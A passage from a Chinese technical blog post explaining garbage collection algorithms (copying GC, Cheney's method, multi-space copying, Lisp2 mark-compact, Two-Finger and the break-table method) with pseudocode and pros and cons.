obj.size)</span><br><span class="line"> obj.tag = COPIED</span><br><span class="line"> obj.forwarding = $free</span><br><span class="line"> $free += obj.size</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj.forwarding))</span><br><span class="line"> *child = <span class="built_in">copy</span>(*child)</span><br><span class="line"> <span class="keyword">return</span> obj.forwarding</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  GC 完成后只有 1 个chunk的内存空间。在每次分配时，只要把所申请大小的内存空间从这个chunk中分割出来给 mutator 就行了。也就是说，这里的分配跟 GC 标记 - 清除算法中的分配不同，不需要遍历空闲链表。</span></span><br><span class="line"><span class="built_in">new_obj</span>(size)&#123;</span><br><span class="line"> <span class="keyword">if</span>($free + size &gt; $from_start + HEAP_SIZE/<span class="number">2</span>)</span><br><span class="line"> <span class="built_in">copying</span>()</span><br><span class="line"> <span class="keyword">if</span>($free + size &gt; $from_start + HEAP_SIZE/<span class="number">2</span>)</span><br><span class="line"> <span class="built_in">allocation_fail</span>()</span><br><span class="line"> obj = $free</span><br><span class="line"> obj.size = size</span><br><span class="line"> $free += size</span><br><span class="line"> <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行过程如下图，通过深搜的方式将根执行的活动对象依次由From空间拷贝到To空间。这里对号表示已经复制完成，对号后面的 B<em>Ꞌ</em> 表示的是forwarding指针，指向To空间。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918175308355.png" alt="image-20210918175308355"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918175957822.png" alt="image-20210918175957822"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918180037270.png" alt="image-20210918180037270"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918180056029.png" alt="image-20210918180056029"></p><h4 id="评估-2"><a href="#评估-2" class="headerlink" title="评估"></a>评估</h4><h5 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h5><ol><li><code>优秀的吞吐量</code>：由于只需要遍历活动对象并清除整个堆的时间，所以它可以在较短时间内完成GC。</li><li><code>可实现高速分配</code>：GC 复制算法不使用空闲链表。这是因为空闲chunk是一个连续的内存空间。通过移动 $free 指针来分配内存。</li><li><code>不会发生碎片化</code>：由于GC复制算法具有“压缩”（把对象重新集中，放在堆的一端的行为）的性质，分配空间直接移动$free指针，就算$free前面的内存被释放了，GC之后又可以将活动对象“压缩”。</li><li><code>与缓存兼容</code>：在 GC 复制算法中有引用关系的对象会被安排在堆里离彼此较近的位置。这可以使 mutator 执行速度加快。</li></ol><h5 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h5><ol><li><code>堆使用效率低</code>：GC 复制算法把堆二等分，只能利用其中的一半来安排对象，浪费空间。</li><li><code>不兼容保守式GC算法</code>：GC 复制算法必须移动对象重写指针，而保守式GC的性质决定了它不允许移动对象。</li><li><code>递归调用函数</code>：复制某个对象时要递归复制它的子对象。因此带来额外的处理负担。相比起递归算法，迭代算法能更高速地执行 。</li></ol><h4 id="优化措施-2"><a href="#优化措施-2" class="headerlink" title="优化措施"></a>优化措施</h4><h5 id="Cheney的GC复制算法"><a href="#Cheney的GC复制算法" class="headerlink" title="Cheney的GC复制算法"></a><strong>Cheney</strong>的<strong>GC</strong>复制算法</h5><p>解决的是<code>递归调用函数</code>的问题。核心在于使用迭代方式遍历复制，但是使用了广搜的方式，但是没有充分利用缓存的便利——有引用关系的对象不相邻。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将 scan 和 $free 的两个指针初始化。scan 是用于搜索复制完成的对象的指针。$free 是指向chunk开头的指针，</span></span><br><span class="line"><span class="built_in">copying</span>()&#123;</span><br><span class="line"> scan = $free = $to_start</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> *r = <span class="built_in">copy</span>(*r)</span><br><span class="line"> <span class="keyword">while</span>(scan != $free)</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(scan))</span><br><span class="line"> *child = <span class="built_in">copy</span>(*child)</span><br><span class="line"> scan += scan.size</span><br><span class="line"> <span class="built_in">swap</span>($from_start, $to_start)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断forwarding指针指向哪块空间来判断是否复制完成，因为复制完成的话该指针指向的是To空间</span></span><br><span class="line"><span class="built_in">copy</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">is_pointer_to_heap</span>(obj.forwarding, $to_start) == FALSE)</span><br><span class="line"> <span class="built_in">copy_data</span>($free, obj, obj.size)</span><br><span class="line"> obj.forwarding = $free</span><br><span class="line"> $free += obj.size</span><br><span class="line"> <span class="keyword">return</span> obj.forwarding</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用了$scan 和 $free。首先复制所有从根直接引用的对象，在这里就是复制 B 和 G。$scan指向当前正在搜索的对象，$free指向空闲chunk的开头。复制的过程中$scan与 $free一般中间会有一部分对象，我们知道这些对象都是活动对象，并按照先入先出（FIFO）的方式进行操作（这样把堆兼用作队列正是 Cheney 算法的一大优点，不用特意为队列留出多余的内存空间就能进行搜索。）。最后复制完成后$scan与 $free会重合。</p><p>【优点】递归方式遍历子对象减轻了调用函数的额外负担和栈的消耗。特别是拿堆用作队列，省去了用于搜索的内存空间的步骤。</p><p>【缺点】具有引用关系的对象是相邻的才能充分利用缓存的便利。在该算法中使用了广搜致使引用对象并不相邻是比较可惜的一点。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918183343751.png" alt="image-20210918183343751"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918183415724.png" alt="image-20210918183415724"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918183511223.png" alt="image-20210918183511223"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918183639356.png" alt="image-20210918183639356"></p><h5 id="近似深度优先搜索方法"><a href="#近似深度优先搜索方法" class="headerlink" title="近似深度优先搜索方法"></a>近似深度优先搜索方法</h5><p>解决的仍然是<code>递归调用函数</code>的问题，对Cheney 的 GC 复制算法进行了缓存上的优化，Cheney 的 GC 复制算法由于在搜索对象上使用了广度优先搜索，因此存在“没法沾缓存的光”的缺点。近似深度优先搜索方法可以解决这个问题。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929100857389.png" alt="image-20210929100857389"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929100928214.png" alt="image-20210929100928214"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929101028643.png" alt="image-20210929101028643"></p><p>当使用近似深度优先搜索算法时，<strong>如果一个对象被安排在页面开头时，直接搜索该对象的子对象。</strong>概念也比较好理解，广搜的过程中对临近对象使用深搜。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918185709778.png" alt="image-20210918185709778"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918185803612.png" alt="image-20210918185803612"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918185829823.png" alt="image-20210918185829823"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918185848639.png" alt="image-20210918185848639"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918185916020.png" alt="image-20210918185916020"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918185942967.png" alt="image-20210918185942967"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918190014890.png" alt="image-20210918190014890"></p><h5 id="多空间复制算法"><a href="#多空间复制算法" class="headerlink" title="多空间复制算法"></a>多空间复制算法</h5><p>GC 复制算法最大的缺点是只能利用半个堆。如果把堆由分成 2 份改为分成 10 份，其中的2 块空间执行 GC 复制算法。其他8份空间执行其他GC算法，就可以提高堆使用效率。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// multi_space_copying：这里将堆 N 等分，每次To空间和From空间都会后移，其余的对象使用GC标记-清除算法。</span></span><br><span class="line"><span class="built_in">multi_space_copying</span>()&#123;</span><br><span class="line"> $free = $heap[$to_space_index]</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> *r = <span class="built_in">mark_or_copy</span>(*r)</span><br><span class="line"> <span class="keyword">for</span>(index : <span class="number">0.</span>.(N<span class="number">-1</span>))</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">is_copying_index</span>(index) == FALSE)</span><br><span class="line"> <span class="built_in">sweep_block</span>(index)</span><br><span class="line"> $to_space_index = $from_space_index</span><br><span class="line"> $from_space_index = ($from_space_index + <span class="number">1</span>) % N</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mark_or_copy：通过判断obj是否在From空间中来决定使用GC复制算法进行处理还是使用GC标记-清除算法进行处理。</span></span><br><span class="line"><span class="built_in">mark_or_copy</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">is_pointer_to_from_space</span>(obj) == TRUE)</span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">copy</span>(obj)</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> <span class="keyword">if</span>(obj.mark == FALSE)</span><br><span class="line"> obj.mark = TRUE</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj))</span><br><span class="line"> *child = <span class="built_in">mark_or_copy</span>(*child)</span><br><span class="line"> <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// copy：for循环中调用的是 mark_or_copy 函数而非 copy 函数。</span></span><br><span class="line"><span class="built_in">copy</span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>(obj.tag != COPIED)</span><br><span class="line"> <span class="built_in">copy_data</span>($free, obj, obj.size)</span><br><span class="line"> obj.tag = COPIED</span><br><span class="line"> obj.forwarding = $free</span><br><span class="line"> $free += obj.size</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(obj.forwarding))</span><br><span class="line"> *child = <span class="built_in">mark_or_copy</span>(*child)</span><br><span class="line"> <span class="keyword">return</span> obj.forwarding</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918191659047.png" alt="image-20210918191659047"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918191738967.png" alt="image-20210918191738967"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210918192110220.png" alt="image-20210918192110220"></p><p>【优点】提高了堆使用效率。</p><p>【缺点】由于引入了GC-标记清除算法，虽然提高了堆使用效率，但是分配耗费时间、chunk碎片化等问题也会出现。</p><h3 id="GC标记-压缩算法（Mark-Compact-GC）"><a href="#GC标记-压缩算法（Mark-Compact-GC）" class="headerlink" title="GC标记-压缩算法（Mark Compact GC）"></a>GC标记-压缩算法（Mark Compact GC）</h3><h4 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h4><p>GC 标记 - 压缩算法由标记阶段和压缩阶段构成。首先，这里的标记阶段和 GC 标记 - 清除算法时提到的标记阶段完全一致。接下来搜索数次堆来进行压缩。压缩一是可以利用缓存优势，二是可以减少内存碎片，也无需牺牲半个堆。</p><h4 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h4><p>首先是经典的Lisp2算法，Lisp2 算法在对象头提供了 $forwarding 指针的空间。 $forwarding 指针指向要移动位置的地址。这也是这个算法的一个劣势（每个对象都要额外占用一个forwarding 指针）。</p><p>为什么每个对象都要额外占用一个forwarding 指针？（由于GC复制算法中使用了两块空间，将数据完成后再将原From空间的数据段选出一部分当作$frorwarding指针，毕竟当复制过程完毕后原From空间的对象也失去了意义。设置$frorwarding的目的是当有指针指向原From空间的原活动对象时，可以使用$forwarding指针将该指针索引到To空间的活动对象中。而Lisp2算法没有类似于To空间这样的复制空间，而且流程是先设置$forwarding指针再去移动对象，所以之前的对象内容需要进行保留，如果仍使用其数据段会覆盖对象原本的内容（GC复制算法随便修改之前对象的内容，之后都会被全部清空），所以需要额外占用一个forwarding 指针存放要移动到的位置）。</p><h5 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h5><p>Lisp2算法的压缩阶段并不会改变对象的排列顺序，只是缩小了它们之间的空隙，把它们聚集到了堆的一端。他和GC复制算法有个很大的区别就是GC复制算法是对每个对象都进行复制对象，对象指针修改，forwarding指针修改，处理完一个对象再处理下一个对象。而Lisp2算法则是分为三个阶段，每个阶段都处理所有对象。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922155103696.png" alt="image-20210922155103696"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922155125161.png" alt="image-20210922155125161"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922155142861.png" alt="image-20210922155142861"></p><h5 id="压缩阶段"><a href="#压缩阶段" class="headerlink" title="压缩阶段"></a>压缩阶段</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// compaction_phase：Lisp2的压缩阶段由三个阶段组成：（1）设定 forwarding 指针； （2）更新指针； （3）移动对象</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">compaction_phase</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="built_in">set_forwarding_ptr</span>()</span><br><span class="line"> <span class="built_in">adjust_ptr</span>()</span><br><span class="line"> <span class="built_in">move_obj</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set_forwarding_ptr：第一阶段遍历一次整个堆空间，并为所有活动对象设定 forwarding指针。</span></span><br><span class="line"><span class="built_in">set_forwarding_ptr</span>()&#123;</span><br><span class="line"> scan = new_address = $heap_start</span><br><span class="line"> <span class="keyword">while</span>(scan &lt; $heap_end)</span><br><span class="line"> <span class="keyword">if</span>(scan.mark == TRUE)</span><br><span class="line"> scan.forwarding = new_address</span><br><span class="line"> new_address += scan.size</span><br><span class="line"> scan += scan.size</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// adjust_ptr：第二阶段又遍历一次堆空间。依据第一阶段得出的forwarding指针，将指向原活动对象的指针变为指向原活动对象forwarding指针位置处，也就是新活动对象位置处。</span></span><br><span class="line"><span class="built_in">adjust_ptr</span>()&#123;</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> *r = (*r).forwarding</span><br><span class="line"> scan = $heap_start</span><br><span class="line"> <span class="keyword">while</span>(scan &lt; $heap_end)</span><br><span class="line"> <span class="keyword">if</span>(scan.mark == TRUE)</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(scan))</span><br><span class="line"> *child = (*child).forwarding</span><br><span class="line"> scan += scan.size</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// move_obj：第三阶段再遍历一次堆空间，将活动对象移动到 forwarding 指针的引用目标处。</span></span><br><span class="line"><span class="built_in">move_obj</span>()&#123;</span><br><span class="line"> scan = $free = $heap_start</span><br><span class="line"> <span class="keyword">while</span>(scan &lt; $heap_end)</span><br><span class="line"> <span class="keyword">if</span>(scan.mark == TRUE)</span><br><span class="line"> new_address = scan.forwarding</span><br><span class="line"> <span class="built_in">copy_data</span>(new_address, scan, scan.size)</span><br><span class="line"> new_address.forwarding = <span class="literal">NULL</span></span><br><span class="line"> new_address.mark = FALSE</span><br><span class="line"> $free += new_address.size</span><br><span class="line"> scan += scan.size</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="评估-3"><a href="#评估-3" class="headerlink" title="评估"></a>评估</h4><h5 id="优点-3"><a href="#优点-3" class="headerlink" title="优点"></a>优点</h5><ol><li><code>堆利用率高</code>：一是因为压缩，使得其基本没有碎片化问题。二是相对于GC复制算法，不需要舍弃半个堆，而可以在整个堆中安排对象。堆使用效率几乎是 GC 复制算法的 2 倍。</li></ol><h5 id="缺点-3"><a href="#缺点-3" class="headerlink" title="缺点"></a>缺点</h5><ol><li><code>吞吐量较低</code>：以Lisp2算法为例，整个过程需要对整个堆进行三次搜索。执行该算法所花费的时间是和堆大小成正比的。</li></ol><h4 id="优化措施-3"><a href="#优化措施-3" class="headerlink" title="优化措施"></a>优化措施</h4><h5 id="Two-Finger算法"><a href="#Two-Finger算法" class="headerlink" title="Two-Finger算法"></a><strong>Two-Finger</strong>算法</h5><p><strong>Two-Finger</strong>算法一是需要所有对象大小一致 ，二是无需forwarding 指针空间 。由以下 2 个步骤构成。（1）移动对象 。 （2）更新指针 。实际上相当于两根手指分别从堆首和堆尾向中间逼近，将后面的活动对象放在前面去，由于对象大小一致，所以这样移动没有任何后顾之忧）</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210922164429281.png" alt="image-20210922164429281"></p><p>实现如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// move_obj：移动对象，使用$free 和 live 两个指针从两端向正中间搜索堆。$free 是用于寻找非活动对象（目标空间）的指针，live 是用于寻找活动对象（原空间）的指针。当两个指针相遇时证明已完成压缩。</span></span><br><span class="line"><span class="built_in">move_obj</span>()&#123;</span><br><span class="line"> $free = $heap_start</span><br><span class="line"> live = $heap_end - OBJ_SIZE</span><br><span class="line"> <span class="keyword">while</span>(TRUE)</span><br><span class="line"> <span class="keyword">while</span>($free.mark == TRUE)</span><br><span class="line"> $free += OBJ_SIZE</span><br><span class="line"> <span class="keyword">while</span>(live.mark == FALSE)</span><br><span class="line"> live -= OBJ_SIZE</span><br><span class="line"> <span class="keyword">if</span>($free &lt; live)</span><br><span class="line"> <span class="built_in">copy_data</span>($free, live, OBJ_SIZE)</span><br><span class="line"> live.forwarding = $free</span><br><span class="line"> live.mark = FALSE</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> <span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// adjust_ptr：调整指向移动前对象的指针，因为移动前的对象位置已经无用，而真正的对象在移动后的位置，所以需要更新指针。</span></span><br><span class="line"><span class="comment">// 这里有个很特别的点，$free指针，由于它的特性，前面都是活动对象，后面都是非活动对象。所以在调整指针的时候可以对指向的位置进行判断，如果在$free后面，就将其赋值为其forwarding 指针位置。（因为后面的对象不用了，所以可以将其对象空间存放forwarding 指针的值而无需单独开辟forwarding 指针的空间。）</span></span><br><span class="line"><span class="built_in">adjust_ptr</span>()&#123;</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> <span class="keyword">if</span>(*r &gt;= $free)</span><br><span class="line"> *r = (*r).forwarding</span><br><span class="line"> scan = $heap_start</span><br><span class="line"> <span class="keyword">while</span>(scan &lt; $free)</span><br><span class="line"> scan.mark = FALSE</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(scan))</span><br><span class="line"> <span class="keyword">if</span>(*child &gt;= $free)</span><br><span class="line"> *child = (*child).forwarding</span><br><span class="line"> scan += OBJ_SIZE</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929142049472.png" alt="image-20210929142049472"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929142101683.png" alt="image-20210929142101683"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929142121318.png" alt="image-20210929142121318"></p><p>【优点】无需要额外的空间存放 forwarding 指针，相比于 Lisp2 算法提高了堆使用效率。</p><p>【优点】由于优化了更新 forwarding 指针的步骤，所以可以少搜索一次整个堆。</p><p>【缺点】不能利用引用对象相邻的缓存优势，这样操作完全不能保证引用对象相邻。</p><p>【缺点】要求所有对象的大小必须一致。不过可以结合BiBOP 法克服这个问题——将同一大小的对象安排在同一个块里，之后对每个块应用 Two-Finger 算法。如下，每个块的活动对象都在它的起始位置</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210929143403705.png" alt="image-20210929143403705"></p><h5 id="表格算法"><a href="#表格算法" class="headerlink" title="表格算法"></a>表格算法</h5><p>这个又是个看起来很恐怖其实也比较好理解的算法。</p><p>表格算法：（1）对象群一起移动。（2）使用了间隙表格来代替forwarding 指针。</p><p>它通过以下 2 个步骤来执行压缩。（1）移动对象（群）以及构筑间隙表格（break table）。（2）更新指针。</p><p>基本思路就是将之前的一个对象一个对象向前移动的方式改为移动对象群，并通过间隙表格存储代替forwarding 指针。间隙表格第一项存储的是被移动对象的起始位置，第二项存储的是要向前移动的长度。（比如下面图片的（100，100）就代表B的起始位置为100，向前移动100到 B<em>Ꞌ</em>）。之后的指针移动也是同理，只不过由原来的通过forwarding 指针索引改编为通过间隙表格索引了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// move_obj：该伪代码只包含了移动对象（群）的操作，而构筑间隙表格（break table）使用了slide_objs_and_make_bt函数实现，伪代码实现比较麻烦，所以下面文字图片方式进行解释。</span></span><br><span class="line"><span class="built_in">move_obj</span>()&#123;</span><br><span class="line"> scan = $free = $heap_start</span><br><span class="line"> size = <span class="number">0</span></span><br><span class="line"> <span class="keyword">while</span>(scan &lt; $heap_end)</span><br><span class="line"> <span class="keyword">while</span>(scan.mark == FALSE)</span><br><span class="line"> size += scan.size</span><br><span class="line"> scan += scan.size</span><br><span class="line"> live = scan</span><br><span class="line"> <span class="keyword">while</span>(scan.mark == TRUE)</span><br><span class="line"> scan += scan.size</span><br><span class="line"> <span class="built_in">slide_objs_and_make_bt</span>(scan, $free, live, size)</span><br><span class="line"> $free += (scan - live)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// adjust_ptr：更新指针</span></span><br><span class="line"><span class="built_in">adjust_ptr</span>()&#123;</span><br><span class="line"> <span class="keyword">for</span>(r : $roots)</span><br><span class="line"> *r = <span class="built_in">new_address</span>(*r)</span><br><span class="line"> scan = $heap_start</span><br><span class="line"> <span class="keyword">while</span>(scan &lt; $free)</span><br><span class="line"> scan.mark = FALSE</span><br><span class="line"> <span class="keyword">for</span>(child : <span class="built_in">children</span>(scan))</span><br><span class="line"> *child = <span class="built_in">new_address</span>(*child)</span><br><span class="line"> scan += scan.size</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 